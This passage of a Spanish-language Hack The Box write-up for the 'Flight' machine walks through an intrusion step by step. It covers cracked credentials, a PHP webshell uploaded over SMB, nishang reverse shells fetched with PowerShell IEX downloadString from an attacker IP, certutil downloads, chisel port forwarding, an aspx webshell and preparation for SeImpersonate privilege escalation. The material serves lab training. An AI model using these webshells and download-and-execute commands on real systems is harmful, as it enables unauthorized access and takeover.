+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+Tikkycoll_431012284 <span class="o">(</span>c.bum<span class="o">)</span>     
+1g 0:00:00:12 DONE <span class="o">(</span>2023-03-15 00:50<span class="o">)</span> 0.08190g/s 862914p/s 862914c/s 862914C/s Tilapia5%..Tikidog
+Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
+Session completed. 
+</code></pre></div></div>
+<p>Tenemos credenciales, vamos a comprobar con crackmapexec si la credenciales son válida para el usuario</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.11.187 <span class="nt">-u</span> <span class="s1">'c.bum'</span> <span class="nt">-p</span> <span class="s1">'Tikkycoll_431012284'</span>
+SMB         10.10.11.187    445    G0               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:G0<span class="o">)</span> <span class="o">(</span>domain:flight.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.187    445    G0               <span class="o">[</span>+] flight.htb<span class="se">\c</span>.bum:Tikkycoll_431012284 
+
+</code></pre></div></div>
+<p>La credencial es válida</p>
+
+<p>Nuevamente con smbmap nos fijamos los recursos compartidos</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.11.187 <span class="nt">-u</span> <span class="s1">'c.bum'</span> <span class="nt">-p</span> <span class="s1">'Tikkycoll_431012284'</span>
+<span class="o">[</span>+] IP: 10.10.11.187:445	Name: flight.htb                                        
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
+	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
+	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+	Shared                                            	READ, WRITE	
+	SYSVOL                                            	READ ONLY	Logon server share 
+	Users                                             	READ ONLY	
+	Web                                               	READ, WRITE	
+</code></pre></div></div>
+
+<p>El recurso Web tiene capacidad de escritura, miremos el recurso con smbclient</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.11.187/Web <span class="nt">-U</span> <span class="s1">'c.bum%Tikkycoll_431012284'</span>
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Wed Mar 15 07:57:00 2023
+  ..                                  D        0  Wed Mar 15 07:57:00 2023
+  flight.htb                          D        0  Wed Mar 15 07:57:00 2023
+  school.flight.htb                   D        0  Wed Mar 15 07:57:00 2023
+
+		5056511 blocks of size 4096. 1216693 blocks available
+smb: <span class="se">\&gt;</span> 
+
+</code></pre></div></div>
+<p>Podemos ver que nos muestra el dominio y el subdominio que enumeramos anteriormente, si entramos a flight.htb vemos que están los archivos de configuración de la página y si le tiramos un whatweb veremos que la web interpreta php</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> <span class="nb">cd </span>flight.htb
+smb: <span class="se">\f</span>light.htb<span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Wed Mar 15 08:02:00 2023
+  ..                                  D        0  Wed Mar 15 08:02:00 2023
+  css                                 D        0  Wed Mar 15 08:02:00 2023
+  images                              D        0  Wed Mar 15 08:02:00 2023
+  index.html                          A     7069  Thu Feb 24 02:58:10 2022
+  js                                  D        0  Wed Mar 15 08:02:00 2023
+
+		5056511 blocks of size 4096. 1216693 blocks available
+smb: <span class="se">\f</span>light.htb<span class="se">\&gt;</span> 
+</code></pre></div></div>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">flight</span><span class="p">.</span><span class="nf">htb</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">flight</span><span class="p">.</span><span class="nf">htb</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Apache</span><span class="p">[</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">52</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">52</span> <span class="p">(</span><span class="no">Win64</span><span class="p">)</span> <span class="no">OpenSSL</span><span class="o">/</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">1</span><span class="n">m</span> <span class="no">PHP</span><span class="o">/</span><span class="mf">8.1</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.187</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">[</span><span class="mf">1.4</span><span class="o">.</span><span class="mi">2</span><span class="p">],</span> <span class="no">OpenSSL</span><span class="p">[</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">1</span><span class="n">m</span><span class="p">],</span> <span class="no">PHP</span><span class="p">[</span><span class="mf">8.1</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">Script</span><span class="p">[</span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="n">g0</span> <span class="no">Aviation</span><span class="p">]</span>
+</code></pre></div></div>
+<p>Probemos subir una webshell</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+  <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>Recuerden que el archivo se borra luego de unos minutos, lo tienen que hacer rápido porque si no la webshell.php se borra</p>
+
+<p>Subamos la webshell.php</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\f</span>light.htb<span class="se">\&gt;</span>  put webshell.php
+putting file webshell.php as <span class="se">\f</span>light.htb<span class="se">\w</span>ebshell.php <span class="o">(</span>0,1 kb/s<span class="o">)</span> <span class="o">(</span>average 0,1 kb/s<span class="o">)</span>
+smb: <span class="se">\f</span>light.htb<span class="se">\&gt;</span> 
+</code></pre></div></div>
+<p>Con curl comprobemos si podemos ejecutar comandos</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="s1">'http://flight.htb/webshell.php?cmd=whoami'</span>
+flight<span class="se">\s</span>vc_apache
+</code></pre></div></div>
+<p>Nos dejó ejecutar el whoami, yo voy a tirar de un script de nishang para tener un revshell</p>
+
+<p>Por acá se los dejo</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">raw</span><span class="p">.</span><span class="nf">githubusercontent</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span><span class="n">samratashok</span><span class="o">/</span><span class="n">nishang</span><span class="o">/</span><span class="n">master</span><span class="o">/</span><span class="no">Shells</span><span class="o">/</span><span class="no">Invoke</span><span class="o">-</span><span class="no">PowerShellTcp</span><span class="p">.</span><span class="nf">ps1</span>
+</code></pre></div></div>
+<p>Lo descargan y le dan el nombre que les guste</p>
+
+<p>Este script lo tiene que colocar al final de la linea del archivo de nishang</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Invoke</span><span class="o">-</span><span class="no">PowerShellTcp</span> <span class="o">-</span><span class="no">Reverse</span> <span class="o">-</span><span class="no">IPAddress</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.105</span> <span class="o">-</span><span class="no">Port</span> <span class="mi">4444</span>
+</code></pre></div></div>
+<p>Ahora nos montamos un servidor web con python y nos ponemos en escucha con netcat, al tira de curl deberíamos recibir la revshell</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</code></pre></div></div>
+<p>Nos ponemos en escucha por netcat</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>rlwrap nc <span class="nt">-lvnp</span> 4444
+listening on <span class="o">[</span>any] 4444 ...
+</code></pre></div></div>
+<p>Y ahora le lanzamos el curl, comprueben que la webshell.php no se les haya eliminado, si se eliminó es simplemente volverlo a subir</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="no">X</span> <span class="no">GET</span> <span class="o">-</span><span class="no">G</span> <span class="s1">'http://flight.htb/webshell.php'</span> <span class="o">--</span><span class="n">data</span><span class="o">-</span><span class="n">urlencode</span> <span class="s2">"cmd=cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.22/sh.ps1')"</span>
+</code></pre></div></div>
+<p>Ganamos acceso</p>
+
+<p><img src="/assets/images/htb-writeup-flight/acceso.png" alt="" /></p>
+
+<p>Al tener dos contraseñas de los otros dos usuarios probemos con conectarnos con el usuario c.bum</p>
+
+<p>Primero descargaremos el RunasCs.exe</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">github</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span><span class="n">antonioCoco</span><span class="o">/</span><span class="no">RunasCs</span><span class="o">/</span><span class="n">releases</span><span class="o">/</span><span class="n">tag</span><span class="o">/</span><span class="n">v1</span><span class="o">.</span><span class="mi">4</span>
+</code></pre></div></div>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">unzip</span>  <span class="no">RunasCs</span><span class="p">.</span><span class="nf">zip</span>
+<span class="no">Archive</span><span class="p">:</span>  <span class="no">RunasCs</span><span class="p">.</span><span class="nf">zip</span>
+  <span class="ss">inflating: </span><span class="no">RunasCs</span><span class="p">.</span><span class="nf">exe</span>             
+  <span class="ss">inflating: </span><span class="no">RunasCs_net2</span><span class="p">.</span><span class="nf">exe</span>        
+<span class="err">❯</span> 
+</code></pre></div></div>
+<p>Ahora lo descargamos en la máquina víctima</p>
+
+<p>Primero montemos un servidor con python3</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+
+</code></pre></div></div>
+<p>El archivo lo voy a transferir usando de certutil.exe</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">htdocs</span><span class="p">\</span><span class="n">flight</span><span class="p">.</span><span class="nf">htb</span><span class="o">&gt;</span><span class="n">certutil</span><span class="p">.</span><span class="nf">exe</span> <span class="o">-</span><span class="n">urlcache</span> <span class="o">-</span><span class="n">f</span> <span class="o">-</span><span class="nb">split</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.105</span><span class="o">/</span><span class="no">RunasCs</span><span class="p">.</span><span class="nf">exe</span>
+<span class="o">****</span>  <span class="no">Online</span>  <span class="o">****</span>
+  <span class="mo">0000</span>  <span class="o">...</span>
+  <span class="n">c000</span>
+<span class="no">CertUtil</span><span class="p">:</span> <span class="o">-</span><span class="no">URLCache</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="o">.</span>
+</code></pre></div></div>
+<p>Ahora ya que tenemos el RunasCs.exe podemos acceder a la máquina como el usuario c.bum, nuevamente nos montamos un servidor en python3
+luego ejecutamos el RunasCs.exe con el script de nishang que utilizamos anteriormente</p>
+
+<p>Montamos el servidor</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+<p>Nos ponemos en escucha por netcat</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>rlwrap nc <span class="nt">-lvnp</span> 4444
+listening on <span class="o">[</span>any] 4444 ...
+
+</code></pre></div></div>
+<p>Y en la máquina víctima ejecutamos el script de nishang</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="nf">/</span><span class="no">RunasCs</span><span class="p">.</span><span class="nf">exe</span> <span class="n">c</span><span class="p">.</span><span class="nf">bum</span> <span class="no">Tikkycoll_431012284</span> <span class="s2">"cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.105/sh.ps1')"</span>
+</code></pre></div></div>
+<p>Ganamos acceso como usuario c.bum</p>
+
+<p><img src="/assets/images/htb-writeup-flight/acceso2.png" alt="" /></p>
+
+<p>Ya podemos ver la primera flag :D</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\C</span>.bum&gt; <span class="nb">cd </span>Desktop
+PS C:<span class="se">\U</span>sers<span class="se">\C</span>.bum<span class="se">\D</span>esktop&gt; <span class="nb">ls
+
+
+    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\C</span>.bum<span class="se">\D</span>esktop
+
+
+Mode                LastWriteTime         Length Name                                                                  
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                                                                  
+<span class="nt">-ar---</span>        3/15/2023   5:30 PM             34 user.txt                                                              
+
+
+PS C:<span class="se">\U</span>sers<span class="se">\C</span>.bum<span class="se">\D</span>esktop&gt; <span class="nb">type </span>user.txt
+a9<span class="k">****************************</span>c
+PS C:<span class="se">\U</span>sers<span class="se">\C</span>.bum<span class="se">\D</span>esktop&gt; 
+</code></pre></div></div>
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<p>Enumeremos el sistema, yo voy a tirar de winpeas.exe</p>
+
+<p>Nos movemos al directorio Temp y lo descargamos con certutil.exe en la máquina víctima</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">certutil</span><span class="p">.</span><span class="nf">exe</span> <span class="o">-</span><span class="n">urlcache</span> <span class="o">-</span><span class="n">f</span> <span class="o">-</span><span class="nb">split</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.105</span><span class="o">/</span><span class="n">winPEASx64</span><span class="p">.</span><span class="nf">exe</span>
+</code></pre></div></div>
+<p>Una vez descargado ejecutamos winpeasx64.exe</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; ./winPEASx64.exe
+
+ Enumerating IPv6 connections
+
+  Protocol   Local Address                               Local Port    Remote Address                              
+
+  TCP        <span class="o">[</span>::]                                        80            <span class="o">[</span>::]                                                       
+  TCP        <span class="o">[</span>::]                                        88            <span class="o">[</span>::]                                                   
+  TCP        <span class="o">[</span>::]                                        135           <span class="o">[</span>::]                                                       
+  TCP        <span class="o">[</span>::]                                        389           <span class="o">[</span>::]                                                       
+  TCP        <span class="o">[</span>::]                                        443           <span class="o">[</span>::]                                                       
+  TCP        <span class="o">[</span>::]                                        445           <span class="o">[</span>::]                                                       
+  TCP        <span class="o">[</span>::]                                        464           <span class="o">[</span>::]                                                     
+  TCP        <span class="o">[</span>::]                                        593           <span class="o">[</span>::]                                                       
+  TCP        <span class="o">[</span>::]                                        636           <span class="o">[</span>::]                                                       
+  TCP        <span class="o">[</span>::]                                        3268          <span class="o">[</span>::]                                                        
+  TCP        <span class="o">[</span>::]                                        3269          <span class="o">[</span>::]                                                        
+  TCP        <span class="o">[</span>::]                                        5985          <span class="o">[</span>::]                                                                 
+  TCP        <span class="o">[</span>::]                                        8000          <span class="o">[</span>::]                                        
+  TCP        <span class="o">[</span>::]                                        9389          <span class="o">[</span>::]
+</code></pre></div></div>
+<p>Vemos que el puerto 8000 está abierto, nmap no nos había reportado esta infomación, como yo no puedo accerder al puerto 8000 desde mi máquina en este punto necesitamos hacer un Remote Port Forwarding, tireremos de chisel</p>
+
+<p>Presten atención, para hacer port forwarding tienen que acceder dos veces como el usuario c.bum siguendo el prodecimiento de acceso como hicimos anteriormente como pueden ver aqui en la imagen</p>
+
+<p><img src="/assets/images/htb-writeup-flight/acceso3.png" alt="" /></p>
+
+<p>Descargamos el chisel, por aca se los dejo</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">github</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span><span class="n">jpillora</span><span class="o">/</span><span class="n">chisel</span><span class="o">/</span><span class="n">releases</span><span class="o">/</span><span class="n">tag</span><span class="o">/</span><span class="n">v1</span><span class="o">.</span><span class="mf">8.1</span>
+</code></pre></div></div>
+<p>Ahora con certutil lo descargamos en la máquina víctima</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">certutil</span><span class="p">.</span><span class="nf">exe</span> <span class="o">-</span><span class="n">urlcache</span> <span class="o">-</span><span class="n">f</span> <span class="o">-</span><span class="nb">split</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.105</span><span class="o">/</span><span class="n">chisel</span><span class="p">.</span><span class="nf">exe</span>
+</code></pre></div></div>
+<p>En nuesta máquina montemos el servidor con chisel</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./chisel server <span class="nt">-p</span> 5432 <span class="nt">--reverse</span>
+2023/03/16 00:38:46 server: Reverse tunnelling enabled
+2023/03/16 00:38:46 server: Fingerprint <span class="nv">n2EBxwcOQvChiSqjw7orAT5DqwWl8dc61s4qmG3WCGg</span><span class="o">=</span>
+2023/03/16 00:38:46 server: Listening on http://0.0.0.0:5432
+</code></pre></div></div>
+<p>Y ahora ejecutamos el chisel en la máquina windows</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">C</span><span class="p">.</span><span class="nf">bum</span><span class="p">\</span><span class="no">Desktop</span><span class="o">&gt;</span> <span class="p">.</span><span class="nf">/</span><span class="n">chisel</span><span class="p">.</span><span class="nf">exe</span> <span class="n">client</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.105</span><span class="p">:</span><span class="mi">5432</span> <span class="no">R</span><span class="p">:</span><span class="mi">8000</span><span class="p">:</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">8000</span>
+</code></pre></div></div>
+<p>Ya teniendo la conexión podemos acceder desde el localhost en el puerto 8000</p>
+
+<p>Revisemos la web</p>
+
+<p><img src="/assets/images/htb-writeup-flight/newpage.png" alt="" /></p>
+
+<p>La web es diferente a las otras que hemos enumerado anteriormente</p>
+
+<p>Intentemos acceder a un recurso que no existe en la web, a ver si se expone el directorio raíz, lo haremos con curl</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">8000</span><span class="o">/</span><span class="no">Prueba</span> <span class="o">|</span><span class="n">grep</span> <span class="s1">'Path'</span>
+
+    <span class="o">&lt;</span><span class="n">tr</span><span class="o">&gt;&lt;</span><span class="n">th</span><span class="o">&gt;</span><span class="no">Physical</span> <span class="no">Path</span><span class="o">&lt;</span><span class="sr">/th&gt;&lt;td&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;C:\inetpub\development\Prueba&lt;/</span><span class="n">td</span><span class="o">&gt;&lt;</span><span class="sr">/tr&gt; 
+
+</span></code></pre></div></div>
+<p>Vemos que el directorio raíz se expone</p>
+
+<p>Si entramos a este directorio podemos ver que tenemos capacidad de escritura</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">icacls</span> <span class="p">.</span>
+<span class="nf">.</span> <span class="n">flight</span><span class="p">\</span><span class="no">C</span><span class="o">.</span><span class="no">Bum</span><span class="p">:(</span><span class="no">OI</span><span class="p">)(</span><span class="no">CI</span><span class="p">)(</span><span class="no">W</span><span class="p">)</span>
+  <span class="no">NT</span> <span class="no">SERVICE</span><span class="p">\</span><span class="no">TrustedInstaller</span><span class="p">:(</span><span class="no">I</span><span class="p">)(</span><span class="no">F</span><span class="p">)</span>
+  <span class="no">NT</span> <span class="no">SERVICE</span><span class="p">\</span><span class="no">TrustedInstaller</span><span class="p">:(</span><span class="no">I</span><span class="p">)(</span><span class="no">OI</span><span class="p">)(</span><span class="no">CI</span><span class="p">)(</span><span class="no">IO</span><span class="p">)(</span><span class="no">F</span><span class="p">)</span>
+  <span class="no">NT</span> <span class="no">AUTHORITY</span><span class="p">\</span><span class="no">SYSTEM</span><span class="p">:(</span><span class="no">I</span><span class="p">)(</span><span class="no">F</span><span class="p">)</span>
+  <span class="no">NT</span> <span class="no">AUTHORITY</span><span class="p">\</span><span class="no">SYSTEM</span><span class="p">:(</span><span class="no">I</span><span class="p">)(</span><span class="no">OI</span><span class="p">)(</span><span class="no">CI</span><span class="p">)(</span><span class="no">IO</span><span class="p">)(</span><span class="no">F</span><span class="p">)</span>
+  <span class="no">BUILTIN</span><span class="p">\</span><span class="no">Administrators</span><span class="p">:(</span><span class="no">I</span><span class="p">)(</span><span class="no">F</span><span class="p">)</span>
+  <span class="no">BUILTIN</span><span class="p">\</span><span class="no">Administrators</span><span class="p">:(</span><span class="no">I</span><span class="p">)(</span><span class="no">OI</span><span class="p">)(</span><span class="no">CI</span><span class="p">)(</span><span class="no">IO</span><span class="p">)(</span><span class="no">F</span><span class="p">)</span>
+  <span class="no">BUILTIN</span><span class="p">\</span><span class="no">Users</span><span class="p">:(</span><span class="no">I</span><span class="p">)(</span><span class="no">RX</span><span class="p">)</span>
+  <span class="no">BUILTIN</span><span class="p">\</span><span class="no">Users</span><span class="p">:(</span><span class="no">I</span><span class="p">)(</span><span class="no">OI</span><span class="p">)(</span><span class="no">CI</span><span class="p">)(</span><span class="no">IO</span><span class="p">)(</span><span class="no">GR</span><span class="p">,</span><span class="no">GE</span><span class="p">)</span>
+  <span class="no">CREATOR</span> <span class="no">OWNER</span><span class="p">:(</span><span class="no">I</span><span class="p">)(</span><span class="no">OI</span><span class="p">)(</span><span class="no">CI</span><span class="p">)(</span><span class="no">IO</span><span class="p">)(</span><span class="no">F</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Para acceder tenemos que subir una webshell, yo voy a usar el cmd.aspx de seclists</p>
+
+<p>Subimos el cmd.aspx a la máquina víctima</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\i</span>netpub<span class="se">\d</span>evelopment&gt; certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> <span class="nt">-split</span> http://10.10.14.105/cmd.aspx
+<span class="k">****</span>  Online  <span class="k">****</span>
+  0000  ...
+  0578
+CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
+PS C:<span class="se">\i</span>netpub<span class="se">\d</span>evelopment&gt; 
+</code></pre></div></div>
+<p>Al acceder a la web podemos ejecutar comandos</p>
+
+<p><img src="/assets/images/htb-writeup-flight/cmd2.png" alt="" /></p>
+
+<p>Usemos el script de nishang que empleamos anteriormente para acceder, hay que ejecutarlo en la webshell</p>
+
+<p>Pongamonos en escucha por netcat</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>rlwrap nc <span class="nt">-lvnp</span> 4444
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> contraseña para voidnet: 
+listening on <span class="o">[</span>any] 4444 ...
+</code></pre></div></div>
+<p>Ahora es ejecutar el script de nishang en la web shell</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cmd</span> <span class="sr">/c powershell IEX(New-Object Net.WebClient).downloadString('http:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.105</span><span class="o">/</span><span class="n">sh</span><span class="p">.</span><span class="nf">ps1</span><span class="err">'</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Volvamos a netcat y vemos que ganamos acceso</p>
+
+<p><img src="/assets/images/htb-writeup-flight/setenso.png" alt="" /></p>
+
+<p>Hacemos whoami /priv y podemos ver que en el apartado SeImpersonatePrivilege está Enabled, por esa vía podemos escalar los privilegios</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="o">&gt;</span> <span class="n">whoami</span> <span class="sr">/priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+PS C:\windows\system32\inetsrv&gt; 
+</span></code></pre></div></div>
+<p>Ahora para escalar los privilegios nos iremos al directorio c:\Windows\Temp, yo voy usar el nc.exe que viene con el sectlists y el JuicyPotatoNG.exe</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">github</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span><span class="n">antonioCoco</span><span class="o">/</span><span class="no">JuicyPotatoNG</span><span class="o">/</span><span class="n">releases</span><span class="o">/</span><span class="n">tag</span><span class="o">/</span><span class="n">v1</span><span class="o">.</span><span class="mi">1</span>
+</code></pre></div></div>
+<p>Ya estando ahí con certutil.exe descargamos el nc.exe y el JuicyPotato.exe</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="no">Temp</span><span class="o">&gt;</span> <span class="n">certutil</span><span class="p">.</span><span class="nf">exe</span> <span class="o">-</span><span class="n">urlcache</span> <span class="o">-</span><span class="n">f</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.105</span><span class="o">/</span><span class="n">nc</span><span class="p">.</span><span class="nf">exe</span> <span class="n">nc</span><span class="p">.</span><span class="nf">exe</span>
+<span class="o">****</span>  <span class="no">Online</span>  <span class="o">****</span>
+<span class="no">CertUtil</span><span class="p">:</span> <span class="o">-</span><span class="no">URLCache</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="o">.</span>
+</code></pre></div></div>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="no">Temp</span><span class="o">&gt;</span> <span class="n">certutil</span><span class="p">.</span><span class="nf">exe</span> <span class="o">-</span><span class="n">urlcache</span> <span class="o">-</span><span class="n">f</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.105</span><span class="o">/</span><span class="no">JuicyPotatoNG</span><span class="p">.</span><span class="nf">exe</span> <span class="no">JuicyPotatoNG</span><span class="p">.</span><span class="nf">exe</span>
+<span class="o">****</span>  <span class="no">Online</span>  <span class="o">****</span>
+<span class="no">CertUtil</span><span class="p">:</span> <span class="o">-</span><span class="no">URLCache</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="o">.</span>
+</code></pre></div></div>
+<p>Ejecutemos el JuicyPotato.exe pero antes tienen que ponerse en escucha por netcat</p>
+
